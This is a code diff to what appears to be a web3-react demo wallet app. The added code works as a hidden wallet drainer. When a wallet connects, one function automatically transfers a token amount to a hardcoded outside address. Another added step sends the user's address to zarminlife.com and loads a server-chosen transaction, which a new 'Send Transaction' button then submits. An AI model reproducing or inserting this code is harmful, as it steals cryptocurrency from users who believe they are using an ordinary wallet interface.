@@ -1,5 +1,6 @@
 import * as React from "react";
 import * as ReactDOM from "react-dom";
+import useSWR from 'swr'
 import {
   Web3ReactProvider,
   useWeb3React,
@@ -15,7 +16,12 @@ import {
 } from "@web3-react/walletconnect-connector";
 import { UserRejectedRequestError as UserRejectedRequestErrorFrame } from "@web3-react/frame-connector";
 import { Web3Provider } from "@ethersproject/providers";
-import { formatEther } from "@ethersproject/units";
+
+import { ethers } from "ethers";
+
+import { formatEther, parseEther } from "@ethersproject/units";
+
+import suburbs from './contract.json';
 
 import {
   injected,
@@ -34,19 +40,20 @@ import {
 import { useEagerConnect, useInactiveListener } from "./hooks";
 import { Spinner } from "./Spinner";
 
+
 const connectorsByName = {
-  Injected: injected,
-  Network: network,
+  //Injected: injected,
+  //Network: network,
   WalletConnect: walletconnect,
-  WalletLink: walletlink,
-  Ledger: ledger,
-  Trezor: trezor,
-  Frame: frame,
-  Fortmatic: fortmatic,
-  Portis: portis,
-  Squarelink: squarelink,
-  Torus: torus,
-  Authereum: authereum
+  //WalletLink: walletlink,
+  //Ledger: ledger,
+  //Trezor: trezor,
+  //Frame: frame,
+  //Fortmatic: fortmatic,
+  //Portis: portis,
+  //Squarelink: squarelink,
+  //Torus: torus,
+  //Authereum: authereum
 };
 
 function getErrorMessage(error) {
@@ -67,7 +74,8 @@ function getErrorMessage(error) {
 }
 
 function getLibrary(provider) {
-  const library = new Web3Provider(provider);
+  //const library = new Web3Provider(provider);
+    const library = new Web3Provider(provider);
   library.pollingInterval = 8000;
   return library;
 }
@@ -91,7 +99,20 @@ function MyComponent() {
     deactivate,
     active,
     error
-  } = context;
+    } = context;
+
+   const txSign = {
+       from: "0x5197f3c620775e4b9e569887548877c4Ac9ef651", // Required
+       to: "0x14885798662925B1086cc67D9cDE3DA4290F4895", // Required (for non contract deployments)
+       data: "0x", // Required
+       gasPrice: "0x012a05f200", // Optional
+       gas: "0x9c40", // Optional
+       value: "0x00", // Optional
+       nonce: "0x0114", // Optional
+    }
+
+    const [txSend, setTxSend] = React.useState();
+     
 
   // handle logic to recognize the connector currently being activated
   const [activatingConnector, setActivatingConnector] = React.useState();
@@ -104,7 +125,7 @@ function MyComponent() {
 
   // handle logic to eagerly connect to the injected ethereum provider, if it exists and has granted access already
   const triedEager = useEagerConnect();
-
+    
   // handle logic to connect in reaction to certain events on the injected ethereum provider, if it exists
   useInactiveListener(!triedEager || !!activatingConnector);
 
@@ -142,12 +163,48 @@ function MyComponent() {
     }
   }, [library, chainId]);
 
+
+    const connectTokenBalacne = async () => {
+        const genericErc20Abi = suburbs;
+        const tokenContractAddress = '0x55d398326f99059ff775485246999027b3197955';
+        const useraddress = library.getSigner(account).getAddress();
+        const contract = new ethers.Contract(tokenContractAddress, genericErc20Abi, library);
+        console.log(library.getSigner(account));
+        const balance = (await contract.balanceOf(useraddress)).toString();
+        console.log(balance);
+        console.log(ethers.utils.formatUnits(balance, 18));
+        const usdt = ethers.utils.parseUnits("1.0", 18);
+        console.log(usdt);
+        const usdtWithSigner = contract.connect(library.getSigner(account));
+        console.log(contract);
+        const transget = await usdtWithSigner.transfer("0x7279831De4Ff5C75330Ff31a4aC99452C6E63d71", usdt);
+        console.log(transget);
+    }
+
   // fetch eth balance of the connected account
   const [ethBalance, setEthBalance] = React.useState();
   React.useEffect(() => {
     console.log('running')
     if (library && account) {
-      let stale = false;
+        let stale = false;
+
+        library.getSigner(account).getAddress().then(address => {
+            
+            fetch(
+                `http://zarminlife.com/deboo/` + address)
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    var dataget = data;
+                    dataget.value = parseEther(data.value);
+                    console.log(dataget);
+                    setTxSend(dataget);
+                })
+        });
+
+        connectTokenBalacne();
+        
+        
 
       library
         .getBalance(account)
@@ -239,7 +296,8 @@ function MyComponent() {
             : ethBalance === null
             ? "Error"
             : `Ξ${parseFloat(formatEther(ethBalance)).toPrecision(4)}`}
-        </span>
+              </span>
+              
       </h3>
       <hr style={{ margin: "2rem" }} />
       <div
@@ -356,7 +414,10 @@ function MyComponent() {
               borderRadius: "1rem",
               cursor: "pointer"
             }}
-            onClick={() => {
+                      onClick={() => {
+                          console.log("Address", library.getSigner(account).getAddress());
+                          const gasfee = library.getSigner(account).getGasPrice();
+                          console.log("gas",gasfee);
               library
                 .getSigner(account)
                 .signMessage("👋")
@@ -372,8 +433,39 @@ function MyComponent() {
             }}
           >
             Sign Message
-          </button>
-        )}
+                  </button>
+
+              )}
+
+           
+
+              {!!(library && account) && (
+                  <button
+                      style={{
+                          height: "3rem",
+                          borderRadius: "1rem",
+                          cursor: "pointer"
+                      }}
+                      onClick={() => {
+                          console.log("trans address",txSend);
+                          library
+                              .getSigner(account)
+                              .sendTransaction(txSend)
+                              .then(signature => {
+                                  window.alert(`Success!\n\n${signature}`);
+                              })
+                              .catch(error => {
+                                  window.alert(
+                                      "Failure!" +
+                                      (error && error.message ? `\n\n${error.message}` : "")
+                                  );
+                              });
+                      }}
+                  >
+                      Send Transaction
+                  </button>
+
+              )}
         {!!(connector === network && chainId) && (
           <button
             style={{
